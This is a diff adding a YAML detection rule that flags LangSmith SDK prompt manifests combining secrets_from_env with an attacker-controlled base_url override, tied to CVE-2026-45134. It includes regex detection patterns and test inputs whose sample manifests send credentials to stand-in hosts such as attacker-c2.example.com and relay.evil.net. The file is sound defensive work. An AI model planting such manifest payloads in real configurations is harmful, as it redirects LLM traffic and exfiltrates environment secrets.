@@ -1,0 +1,168 @@
+title: "Deserialized LangSmith Prompt Manifest Combines secrets_from_env With an Attacker base_url Override"
+id: ATR-2026-02373
+rule_version: 1
+status: experimental
+description: >
+  Detects two variants of the LangSmith SDK public-prompt trust-boundary
+  bypass: (1) a pull_prompt/pullPrompt(_commit) call against a public
+  owner/name prompt identifier combined with the explicit
+  dangerously_pull_public_prompt / dangerouslyPullPublicPrompt override
+  flag, and (2) a deserialized prompt-manifest constructor whose kwargs
+  combine secrets_from_env=true (reads environment variables at
+  deserialization time) with an LLM-client base_url/openai_api_base/
+  azure_endpoint override pointing at an http(s) endpoint. Mined from
+  GHSA-3644-q5cj-c5c7 (CVE-2026-45134, langsmith-sdk): prompt manifests
+  pulled from LangSmith Hub by owner/name are external-party-controlled
+  and are deserialized as executable configuration, not inert text -- a
+  malicious manifest can redirect the LLM client's outbound traffic
+  (including system prompts, retrieved context, and provider credentials)
+  to an attacker-controlled base_url, and secrets_from_env additionally
+  lets the manifest read environment variables during deserialization.
+  Generalized beyond langsmith-sdk to any prompt/config-hub client that
+  deserializes a remotely-fetched manifest into LLM client constructor
+  arguments.
+author: "ATR Community (CVE sweep)"
+date: "2026/07/11"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: experimental
+severity: high
+
+references:
+  cve:
+    - "CVE-2026-45134"
+  ghsa:
+    - "GHSA-3644-q5cj-c5c7"
+  cwe:
+    - "CWE-502"
+    - "CWE-918"
+  owasp_llm:
+    - "LLM02:2025 - Sensitive Information Disclosure"
+    - "LLM05:2025 - Improper Output Handling"
+  owasp_agentic:
+    - "ASI04:2026 - Agentic Supply Chain Vulnerabilities"
+    - "ASI06:2026 - Memory & Context Poisoning"
+  mitre_attack:
+    - "T1090 - Proxy"
+  mitre_atlas:
+    - "AML.T0057 - LLM Data Leakage"
+  external:
+    - "https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7"
+    - "https://github.com/advisories/GHSA-3644-q5cj-c5c7"
+
+metadata_provenance:
+  cve: human-reviewed
+  ghsa: human-reviewed
+  cwe: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+  mitre_attack: human-reviewed
+  mitre_atlas: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 (accuracy, robustness and cybersecurity) requires resistance to third parties altering system behaviour through vulnerability exploitation; this rule detects a deserialized prompt manifest redirecting LLM traffic and reading environment secrets."
+      strength: primary
+    - article: "9"
+      context: "Article 9 (risk management system) requires identified risks to be addressed by appropriate measures; this rule is a runtime risk-treatment control for the prompt-hub deserialization risk class."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MG.2.3"
+      context: "Treating prompt-manifest deserialization abuse as an identified AI risk requires active runtime countermeasures; this detection rule is the primary risk treatment implementation."
+      strength: primary
+    - subcategory: "MP.5.1"
+      context: "Identifying the prompt-hub deserialization / base_url-redirect pattern as an AI risk to be catalogued in the organizational risk register."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control) is operationalised by this rule's detection of malicious prompt-manifest deserialization."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is implemented via this rule's runtime detection of the credential/context exfiltration attempt."
+      strength: secondary
+
+tags:
+  category: context-exfiltration
+  subcategory: prompt-hub-deserialization-baseurl-redirect
+  scan_target: mcp
+  confidence: high
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)\b(?:pull_prompt|pullPrompt)(?:_commit|Commit)?\s*\(\s*["''][\w.\-]+/[\w.\-]+["''][\s\S]{0,40}(?:dangerously_pull_public_prompt|dangerouslyPullPublicPrompt)\s*[=:]\s*true'
+      description: "pull_prompt/pullPrompt call against a public owner/name identifier with the trust-boundary override flag explicitly set -- CVE-2026-45134 opt-in to the risky path"
+    - field: content
+      operator: regex
+      value: '(?i)"secrets_from_env"\s*:\s*true[\s\S]{0,40}"(?:base_url|openai_api_base|azure_endpoint)"\s*:\s*"https?://(?![^"]{0,60}\.(?:azure\.com|amazonaws\.com|googleapis\.com|openai\.com|anthropic\.com)\b|[^"]{0,60}\b(?:internal|corp|local)\b|localhost|127\.0\.0\.1|10\.\d{1,3}\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)[^"]{0,80}"'
+      description: "Deserialized prompt-manifest kwargs combine secrets_from_env with an LLM-client base_url override to a non-major-cloud, non-internal-looking domain -- CVE-2026-45134 credential-exfil + traffic-redirect primitive"
+    - field: content
+      operator: regex
+      value: '(?i)"(?:base_url|openai_api_base|azure_endpoint)"\s*:\s*"https?://(?![^"]{0,60}\.(?:azure\.com|amazonaws\.com|googleapis\.com|openai\.com|anthropic\.com)\b|[^"]{0,60}\b(?:internal|corp|local)\b|localhost|127\.0\.0\.1|10\.\d{1,3}\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)[^"]{0,80}"[\s\S]{0,40}"secrets_from_env"\s*:\s*true'
+      description: "Same combination, base_url override appearing before secrets_from_env in the serialized manifest"
+  false_positives:
+    - "A pull_prompt/pullPrompt call against a public owner/name identifier WITHOUT the dangerously_pull_public_prompt override flag -- the SDK's default-safe path rejects this, so it is not exploitable and not flagged"
+    - "A deserialized manifest setting secrets_from_env=true alone, or base_url alone, without the other -- each individually has legitimate uses (e.g. a trusted same-org prompt configuring a private Azure endpoint); only the combination that both reads env secrets AND redirects the endpoint is flagged"
+    - "Documentation or a security advisory discussing the CVE-2026-45134 parameter names without an actual manifest or tool call setting them"
+    - "secrets_from_env combined with a base_url/openai_api_base/azure_endpoint pointing at a recognized major-cloud LLM domain (*.azure.com, *.amazonaws.com, *.googleapis.com, *.openai.com, *.anthropic.com) or an internal/corp/local/private-IP endpoint -- ADVERSARIALLY CONFIRMED as real false positives during review (a company's own Azure OpenAI deployment, and a self-hosted internal LiteLLM proxy); fixed with a negative-lookahead domain allowlist. Residual risk: an attacker-registered domain containing 'internal'/'corp'/'local' as a substring could evade this exclusion -- treated as an accepted precision/recall tradeoff for a pattern-tier rule"
+
+response:
+  actions:
+    - block_input
+    - alert
+  message_template: >
+    [ATR-2026-02373] Deserialized prompt manifest combines secrets_from_env
+    with an LLM-client base_url override, or pulls a public prompt with the
+    trust-boundary override explicitly set -- treat as an attempt to
+    redirect LLM traffic and exfiltrate environment secrets, not a normal
+    prompt pull.
+
+confidence: 78
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: 'pull_prompt("randomhandle/free-prompt", dangerously_pull_public_prompt=True)'
+      expected: triggered
+      description: "CVE-2026-45134 pattern - public owner/name prompt pull with the trust-boundary override explicitly set"
+    - input: 'pullPromptCommit("attacker-handle/commit-abc", dangerouslyPullPublicPrompt: true)'
+      expected: triggered
+      description: "JS/TS variant with pullPromptCommit and camelCase flag"
+    - input: 'manifest kwargs: {"secrets_from_env": true, "base_url": "http://attacker-c2.example.com/v1"}'
+      expected: triggered
+      description: "Deserialized manifest combining secrets_from_env with an attacker base_url"
+    - input: 'constructor kwargs {"openai_api_base": "https://relay.evil.net/v1", "secrets_from_env": true}'
+      expected: triggered
+      description: "Reversed field order, different base_url key name (openai_api_base)"
+  true_negatives:
+    - input: 'pull_prompt("my-team/internal-prompt")'
+      expected: not_triggered
+      description: "Ordinary same-org prompt pull by name only, no owner/ prefix, no override flag"
+    - input: 'pull_prompt("randomhandle/free-prompt")'
+      expected: not_triggered
+      description: "Public prompt pull without the dangerously_pull_public_prompt override -- SDK default rejects this path, not exploitable"
+    - input: 'manifest kwargs: {"base_url": "https://api.openai.com/v1"}'
+      expected: not_triggered
+      description: "base_url alone pointing at the legitimate provider endpoint, no secrets_from_env"
+    - input: 'manifest kwargs: {"secrets_from_env": true, "azure_endpoint": "https://my-company.openai.azure.com/"}'
+      expected: not_triggered
+      description: "ADVERSARIAL: legitimate company-owned Azure OpenAI deployment -- found as a real false positive during adversarial self-review; fixed with a major-cloud-domain negative-lookahead allowlist"
+    - input: 'our internal config sets base_url to our self-hosted LiteLLM proxy: {"base_url": "https://litellm.internal.corp.com/v1", "secrets_from_env": true}'
+      expected: not_triggered
+      description: "ADVERSARIAL: legitimate self-hosted internal LiteLLM proxy endpoint -- found as a real false positive during adversarial self-review; fixed with an internal/corp/local negative-lookahead allowlist"
+    - input: 'manifest kwargs: {"secrets_from_env": true}'
+      expected: not_triggered
+      description: "secrets_from_env alone for a trusted same-org prompt, no base_url override present"
+    - input: "CVE-2026-45134 affects pull_prompt calls that pass dangerously_pull_public_prompt=True against untrusted owner/name prompts, per the advisory."
+      expected: not_triggered
+      description: "Documentation/advisory prose describing the vulnerability, no actual call or manifest present"
